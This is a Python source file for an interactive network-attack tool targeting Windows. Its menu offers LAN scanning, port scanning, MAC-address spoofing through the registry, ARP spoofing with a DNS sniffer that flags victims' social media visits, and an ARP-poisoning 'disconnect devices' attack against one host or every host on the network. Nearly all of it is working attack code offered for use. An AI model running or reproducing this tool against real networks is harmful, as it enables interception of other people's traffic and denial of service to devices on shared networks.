# Coded by ASGARD (Ali Emad)

import logging
from scapy.all import ARP, send, sniff, getmacbyip
from scapy.layers.dns import DNS, DNSQR, IP
from scapy.layers.l2 import arping
import threading
import socket
import subprocess
import re
import os
import time
import random

red = "\033[91m"
green = "\033[92m"
white = "\033[97m"
yellow = "\033[33m"
SkyB = "\033[36m"
blue = "\033[34m"
purple = "\033[35m"
gray = "\033[90m"
reset = "\033[0m"


# -----------------------
# scanner start |
# -----------------------
def scan_network(subnet):
    print(f"{blue}Scanner is running...{reset}")

    # List of common Nmap installation paths on Windows
    nmap_paths = [
        r"C:\Program Files (x86)\Nmap\nmap.exe",
        r"C:\Program Files\Nmap\nmap.exe",
        "nmap", 
    ]

    for nmap_path in nmap_paths:
        try:
            result = subprocess.run(
                [nmap_path, "-sn", subnet], capture_output=True, text=True, check=False
            )

            if result.returncode == 0:
                # Parse and display results
                for line in result.stdout.split("\n"):
                    if "Nmap scan report for" in line:
                        ip = line.split()[-1].strip("()")
                        mac = getmacbyip(ip)
                        if mac:
                            print(f"{green}Found device: {ip} | MAC: {mac}{reset}")
                return

        except FileNotFoundError:
            continue
        except Exception as e:
            print(f"{red}Error with {nmap_path}: {str(e)}{reset}")
            continue

    print(
        f"{red}Error: Nmap not found. Please ensure it's installed and try again.{reset}"
    )
    print(f"{yellow}Download Nmap from: https://nmap.org/download.html{reset}")


def scanner():
    while True:
        OneOrAll = input(
            f"""{blue}
1 - scan one
2 - scan all
3 - exit
choose : {white}"""
        )
        if OneOrAll == "1":
            while True:
                check_ip = input(
                    f"{yellow}- Write (0) to exit{blue}\nEnter the ip : {reset}"
                )
                if check_ip == "0":
                    break
                else:
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", check_ip],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    if result.returncode == 0:
                        check_mac = getmacbyip(check_ip)
                        print(
                            f"{green}{check_ip} | {check_mac} \nit is found in your WiFi!{reset}"
                        )
                    else:
                        print(f"{red}it is not found!{reset}")
        elif OneOrAll == "2":
            scan_network("192.168.0.1/24")

        elif OneOrAll == "3":
            break


# ----------------------
# scanner end  |
# ----------------------
##################################
# ------------------------
# spoofing start |
# ------------------------
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def dns_target(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode()

        # Define common services and their keywords
        social_media = {
            "instagram": f"{purple}Instagram{reset}",
            "facebook": f"{blue}Facebook{reset}",
            "youtube": f"{red}YouTube{reset}",
            "tiktok": f"{SkyB}TikTok{reset}",
            "twitter": f"{blue}Twitter{reset}",
            "netflix": f"{red}Netflix{reset}",
            "spotify": f"{green}Spotify{reset}",
            "whatsapp": f"{green}WhatsApp{reset}",
            "telegram": f"{blue}Telegram{reset}",
            "snapchat": f"{yellow}Snapchat{reset}",
            "discord": f"{purple}Discord{reset}",
            "twitch": f"{purple}Twitch{reset}",
            "amazon": f"{yellow}Amazon{reset}",
            "reddit": f"{red}Reddit{reset}",
            "linkedin": f"{blue}LinkedIn{reset}",
        }

        try:
            hostname = socket.gethostbyaddr(ip_src)[0]
        except socket.herror:
            hostname = "Unknown"

        # Check if the DNS query matches any social media service
        matched_service = None
        for service, colored_name in social_media.items():
            if service in dns_query.lower():
                matched_service = colored_name
                break

        if matched_service:
            print(f"{yellow}[!] Social Media Access - {matched_service}")
            print(f"    IP: {ip_src} ({hostname})")
            print(f"    Query: {dns_query}{reset}")
        else:
            print(f"{green}DNS Query {ip_src} ({hostname}): {dns_query}{reset}")


def start_arp(target_ip, gateway_ip):
    print(f"{yellow}Resolving MAC addresses...{reset}")

    # Try multiple times to get MAC addresses
    for _ in range(3):
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)

        if target_mac and gateway_mac:
            break
        time.sleep(1)

    if not target_mac:
        print(f"{red}Could not get MAC address for {target_ip}{reset}")
        return
    if not gateway_mac:
        print(f"{red}Could not get MAC address for {gateway_ip}{reset}")
        return

    print(f"{green}Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}{reset}")

    # Enable IP routing on Windows
    try:
        subprocess.run(
            ["powershell", "Set-NetIPInterface -Forwarding Enabled"],
            check=True,
            capture_output=True,
        )
    except Exception as e:
        print(f"{red}Failed to enable IP forwarding: {str(e)}{reset}")
        return

    try:
        while True:
            arp_spoof(target_ip, gateway_ip, target_mac)
            arp_spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        print(f"{red}Error in ARP spoofing: {str(e)}{reset}")
    finally:
        # Disable IP forwarding
        try:
            subprocess.run(
                ["powershell", "Set-NetIPInterface -Forwarding Disabled"],
                check=True,
                capture_output=True,
            )
        except:
            pass


# -----------------------
# spoofing end |
# -----------------------
##################################
# -------------------------------
# Port Scanner start |
# -------------------------------
def port_scanner(ip_to_check):
    found_port = 0
    for openport in range(1, 1024):
        s = socket.socket()
        s.settimeout(0.5)
        result = s.connect_ex((ip_to_check, openport))
        if result == 0:
            print(f"{green}[+] Port {openport} is open{reset}")
            s.close()
            found_port = 1
    if found_port == 0:
        print(f"{red}No open ports found{reset}")


# ------------------------------
# Port Scanner end |
# ------------------------------
##################################
# --------------------------
# show info start |
# --------------------------
def show_information():
    try:
        # Get network interfaces info using ipconfig
        result = subprocess.run(
            ["ipconfig", "/all"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True,
        )

        output = result.stdout
        lines = output.split("\n")

        current_adapter = None
        found_any = False
        current_ip = None
        current_mac = None

        # List of keywords to skip for VPN and virtual adapters
        skip_adapters = ["vpn", "virtual", "nordlynx", "tunnel", "pseudo"]

        for line in lines:
            line = line.strip()

            # Check for adapter name
            if "adapter" in line.lower() and ":" in line:
                if current_adapter and current_ip and current_mac:
                    print(f"{green}~ Interface: {current_adapter}")
                    print(f"~ IP Address: {current_ip}")
                    print(f"~ MAC Address: {current_mac}{reset}")
                    print("-" * 40)
                    found_any = True

                # Skip VPN and virtual adapters
                if any(x in line.lower() for x in skip_adapters):
                    current_adapter = None
                    current_ip = None
                    current_mac = None
                    continue
                current_adapter = line.split(":")[0].strip()
                current_ip = None
                current_mac = None
                continue

            # Only process if we have a valid adapter
            if current_adapter:
                # Get IP address
                if "IPv4 Address" in line:
                    current_ip = line.split(":")[1].strip().replace("(Preferred)", "")

                # Get MAC address
                if "Physical Address" in line:
                    current_mac = line.split(":")[1].strip()

        if current_adapter and current_ip and current_mac:
            print(f"{green}~ Interface: {current_adapter}")
            print(f"~ IP Address: {current_ip}")
            print(f"~ MAC Address: {current_mac}{reset}")
            print("-" * 40)
            found_any = True

        if not found_any:
            print(f"{red}~ No physical network adapters found{reset}")

    except Exception as e:
        print(f"{red}Error getting network information: {str(e)}{reset}")


# ------------------------
# show info end |
# ------------------------
##################################
# --------------------------------
# disconnected start |
# --------------------------------
def disconn(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def start_attack(target_ip, gateway_ip, target_mac):
    while True:
        disconn(target_ip, gateway_ip, target_mac)
        disconn(gateway_ip, target_ip, getmacbyip(gateway_ip))
        time.sleep(2)


# ------------------------------
# disconnected end |
# ------------------------------
##################################
# -------------------------------
# mac changer start |
# -------------------------------
def get_network_interfaces():
    try:
        # Get list of network adapters using PowerShell
        ps_cmd = """
Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object Name | Format-Table -HideTableHeaders
"""
        result = subprocess.run(
            ["powershell", "-Command", ps_cmd], capture_output=True, text=True
        )

        # Parse the output and remove empty lines
        interfaces = [
            line.strip() for line in result.stdout.split("\n") if line.strip()
        ]

        if not interfaces:
            print(f"{red}No active network interfaces found{reset}")
            return None

        # Print available interfaces
        print(f"{blue}Available network interfaces:{reset}")
        for i, iface in enumerate(interfaces, 1):
            print(f"{green}{i} - {iface}{reset}")

        # Let user choose an interface
        while True:
            try:
                choice = int(input(f"{blue}Select interface number: {reset}"))
                if 1 <= choice <= len(interfaces):
                    return interfaces[choice - 1]
                else:
                    print(
                        f"{red}Please enter a number between 1 and {len(interfaces)}{reset}"
                    )
            except ValueError:
                print(f"{red}Invalid input. Please enter a number.{reset}")

    except Exception as e:
        print(f"{red}Error getting network interfaces: {str(e)}{reset}")
        return None


def check_mac_support(interface):
    # Check multiple possible display names for MAC address property
    ps_cmd = f"""
$adapter = Get-NetAdapter -Name '{interface}'
$possibleNames = @('Network Address', 'Locally Administered Address', 'MAC Address')
foreach ($name in $possibleNames) {{
    $prop = Get-NetAdapterAdvancedProperty -Name '{interface}' -DisplayName $name -ErrorAction SilentlyContinue
    if ($prop) {{ 
        Write-Output "Supported"
        exit
    }}
}}
Write-Output "Not supported"
"""
    res = subprocess.run(
        ["powershell", "-Command", ps_cmd], capture_output=True, text=True
    )
    return "Supported" in res.stdout.strip()


def mac_changer():
    interface = get_network_interfaces()
    if not interface:
        return

    # Get adapter info including registry path
    ps_cmd = f"""
$adapter = Get-NetAdapter -Name '{interface}'
$registryPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}"
$adapterKey = Get-ChildItem $registryPath | Where-Object {{ 
    $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
    $props -and $props.DriverDesc -eq $adapter.InterfaceDescription
}} | Select-Object -First 1

if ($adapterKey) {{
    $adapterKey.PSPath
}} else {{
    Write-Output "Not found"
}}
"""
    res = subprocess.run(
        ["powershell", "-Command", ps_cmd], capture_output=True, text=True
    )
    reg_path = res.stdout.strip()

    if "Not found" in reg_path or not reg_path:
        print(f"{red}Could not find registry path for adapter {interface}{reset}")
        print(f"{yellow}Trying alternative method...{reset}")

        # Alternative method using direct registry access by interface name
        ps_cmd = f"""
$adapter = Get-NetAdapter -Name '{interface}'
if ($adapter) {{
    "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\" + (Get-NetAdapter -Name '{interface}').InterfaceGuid
}} else {{
    "Not found"
}}
"""
        res = subprocess.run(
            ["powershell", "-Command", ps_cmd], capture_output=True, text=True
        )
        reg_path = res.stdout.strip()

    if "Not found" in reg_path or not reg_path:
        print(f"{red}Failed to find registry path for adapter {interface}{reset}")
        return

    new_mac = input(
        f"{blue}Enter the new MAC address (format: XX:XX:XX:XX:XX:XX): {reset}"
    ).strip()

    # Validate MAC address format
    mac_pattern = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$")
    if not mac_pattern.match(new_mac):
        print(
            f"{red}Invalid MAC address format. Please use format like: 00:11:22:33:44:55{reset}"
        )
        return

    mac_value = new_mac.replace(":", "").replace("-", "").upper()

    # Set MAC using registry with error handling
    ps_cmd = f"""
try {{
    $regPath = '{reg_path}'
    $adapterName = '{interface}'
    
    # Check if we can access the registry path
    if (-not (Test-Path $regPath)) {{
        Write-Error "Registry path not found: $regPath"
        exit 1
    }}
    
    # Set the MAC address in registry
    Set-ItemProperty -Path $regPath -Name "NetworkAddress" -Value "{mac_value}" -ErrorAction Stop
    
    # Disable and enable the adapter
    Write-Host "Disabling adapter..."
    Disable-NetAdapter -Name $adapterName -Confirm:$false -ErrorAction Stop
    
    Start-Sleep -Seconds 3
    
    Write-Host "Enabling adapter..."
    Enable-NetAdapter -Name $adapterName -Confirm:$false -ErrorAction Stop
    
    Start-Sleep -Seconds 2
    
    # Verify the change
    $newMac = (Get-NetAdapter -Name $adapterName).MacAddress
    Write-Host "New MAC address: $newMac"
    
    if ($newMac -replace '-','' -eq "{mac_value}") {{
        Write-Host "SUCCESS"
    }} else {{
        Write-Host "VERIFICATION_FAILED"
    }}
}} catch {{
    Write-Error $_.Exception.Message
    exit 1
}}
"""
    print(f"{yellow}Changing MAC address...{reset}")
    res = subprocess.run(
        ["powershell", "-Command", ps_cmd], capture_output=True, text=True
    )

    if res.returncode == 0:
        if "SUCCESS" in res.stdout:
            print(f"{green}MAC address changed successfully to: {new_mac}{reset}")
        elif "VERIFICATION_FAILED" in res.stdout:
            print(
                f"{yellow}MAC address was set but verification failed. Please check manually.{reset}"
            )
        else:
            print(f"{green}MAC address change process completed.{reset}")
    else:
        print(f"{red}Failed to change MAC address.{reset}")
        if res.stderr:
            print(f"{red}Error: {res.stderr}{reset}")
        print(f"{yellow}Make sure you are running as Administrator.{reset}")


def rand_mac():
    interface = get_network_interfaces()
    if not interface:
        return

    # Check if MAC changes are supported
    if not check_mac_support(interface):
        print(
            f"{red}This network adapter ({interface}) doesn't support MAC address changes.{reset}"
        )
        print(
            f"{yellow}Try using your network adapter's vendor software instead.{reset}"
        )
        return

    # Generate random MAC (make sure second character is 2, 6, A, or E for locally administered)
    first_byte = random.choice(["02", "06", "0A", "0E"])
    limit = "abcdef0123456789"
    r_mac = first_byte
    for i in range(5):
        part = "".join(random.choices(limit, k=2))
        r_mac += ":" + part

    print(f"{yellow}Generated MAC address: {r_mac}{reset}")

    # Use the same set_mac logic as mac_changer but with the random MAC
    # Simplified version for random MAC
    mac_value = r_mac.replace(":", "").upper()
    ps_cmd = f"""
try {{
    $adapterName = '{interface}'
    
    # First try to set via registry
    $registryPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}"
    $adapterKey = Get-ChildItem $registryPath | Where-Object {{ 
        $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
        $props -and $props.DriverDesc -eq (Get-NetAdapter -Name $adapterName).InterfaceDescription
    }} | Select-Object -First 1
    
    if ($adapterKey) {{
        Set-ItemProperty -Path $adapterKey.PSPath -Name "NetworkAddress" -Value "{mac_value}"
    }}
    
    # Disable and enable adapter
    Disable-NetAdapter -Name $adapterName -Confirm:$false
    Start-Sleep -Seconds 3
    Enable-NetAdapter -Name $adapterName -Confirm:$false
    Start-Sleep -Seconds 2
    
    $verifiedMac = (Get-NetAdapter -Name $adapterName).MacAddress
    if ($verifiedMac -replace '-','' -eq "{mac_value}") {{
        Write-Host "SUCCESS"
    }} else {{
        Write-Host "Current MAC: $verifiedMac"
    }}
}} catch {{
    Write-Error $_.Exception.Message
}}
"""
    print(f"{yellow}Changing to random MAC address...{reset}")
    res = subprocess.run(
        ["powershell", "-Command", ps_cmd], capture_output=True, text=True
    )

    if res.returncode == 0 and "SUCCESS" in res.stdout:
        print(f"{green}MAC address successfully changed to: {r_mac}{reset}")
    else:
        print(f"{red}Failed to change MAC address.{reset}")
        if res.stderr:
            print(f"{red}Error: {res.stderr}{reset}")
        print(
            f"{yellow}Please run as Administrator and ensure the network adapter supports MAC changes.{reset}"
        )


# -------------------------------
# mac changer end |
# -------------------------------

while True:
    os.system("cls")
    x = input(
        f"""{SkyB}
1 - WiFi Scanner
2 - Arp Spoofing & Sniffer
3 - Port Scanner
4 - Your information
5 - Disconnect devices
6 - Change Your MAC Address

Choose : {white}"""
    )
    if x == "1":
        os.system("cls")
        scanner()
    elif x == "2":
        os.system("cls")
        print(f"{blue}Available devices on network:{reset}")

        # Scan network first to show available targets
        try:
            ans, unans = arping("192.168.0.0/24", timeout=2, verbose=False)
            devices = []
            for snd, rcv in ans:
                ip = rcv.psrc
                mac = rcv.hwsrc
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "Unknown"
                devices.append((ip, mac, hostname))
                print(
                    f"{green}{len(devices)}. IP: {ip} | MAC: {mac} | Name: {hostname}{reset}"
                )
        except Exception as e:
            print(f"{red}Error scanning network: {str(e)}{reset}")
            continue

        if not devices:
            print(f"{red}No devices found on network{reset}")
            continue

        # Let user choose from available devices
        while True:
            choice = input(f"{blue}Enter device number (or 0 to cancel): {reset}")
            if choice == "0":
                break
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(devices):
                    target_ip = devices[idx][0]
                    target_mac = devices[idx][1]
                    print(
                        f"{yellow}Selected target: {target_ip} ({devices[idx][2]}){reset}"
                    )

                    gateway_ip = "192.168.0.1"
                    print(f"{yellow}Starting ARP spoofing...{reset}")

                    # Start ARP spoofing in background thread
                    spoof_thread = threading.Thread(
                        target=start_arp, args=(target_ip, gateway_ip), daemon=True
                    )
                    spoof_thread.start()

                    print(f"{green}[*] Network Traffic Monitor{reset}")
                    print("-" * 40)
                    print(f"{'IP Address' : <15} \t {'DNS Query' :<30}")
                    print("-" * 40)

                    try:
                        sniff(filter="udp port 53", prn=dns_target, store=0)
                    except KeyboardInterrupt:
                        print(f"{red}\n[!] Stopping attack...{reset}")
                    except Exception as e:
                        print(f"{red}Error: {str(e)}{reset}")
                    break
                else:
                    print(f"{red}Invalid device number{reset}")
            except ValueError:
                print(f"{red}Please enter a valid number{reset}")
    elif x == "3":
        os.system("cls")
        while True:
            ip_to_check = input(
                f"{yellow}- Write (0) to exit {blue}\nenter the ip : {reset}"
            )
            if ip_to_check == "0":
                break
            else:
                port_scanner(ip_to_check)
    elif x == "4":
        show_information()
    elif x == "5":
        os.system("cls")
        while True:
            options = input(
                f"""{blue}
1 - one device
2 - all devices
3 - exit
choose : {white}"""
            )
            if options == "1":
                target_ip = input("Enter target ip : ")
                gateway_ip = "192.168.0.1"
                target_mac = getmacbyip(target_ip)
                threading.Thread(
                    target=start_attack,
                    args=(target_ip, gateway_ip, target_mac),
                    daemon=True,
                ).start()
                print(
                    f"{green}[+] The internet connection has been disconnected from {target_ip} | {target_mac}{reset}"
                )
                start_attack(target_ip, gateway_ip, target_mac)
            elif options == "2":
                gateway_ip = "192.168.0.1"  # Define gateway_ip here
                print(
                    f"{green}[+] The internet connection has been disconnected from all devices{reset}"
                )
                try:
                    ans, unans = arping("192.168.0.1/24", timeout=2, verbose=False)
                    for snd, rcv in ans:
                        target_ip = rcv.psrc
                        target_mac = rcv.hwsrc
                        if target_ip != gateway_ip:
                            threading.Thread(
                                target=start_attack,
                                args=(target_ip, gateway_ip, target_mac),
                                daemon=True,
                            ).start()
                except Exception as e:
                    print(f"{red}Error scanning network: {str(e)}{reset}")

            elif options == "3":
                break
    elif x == "6":
        op = input(
            f"""{blue}
1 - Random MAC
2 - Custom Mac
3 - Exit
choose : {reset}"""
        )
        if op == "1":
            rand_mac()
        elif op == "2":
            mac_changer()
        elif op == "3":
            continue
    else:
        print(f"{red}Invalid option. Please choose 1-6.{reset}")
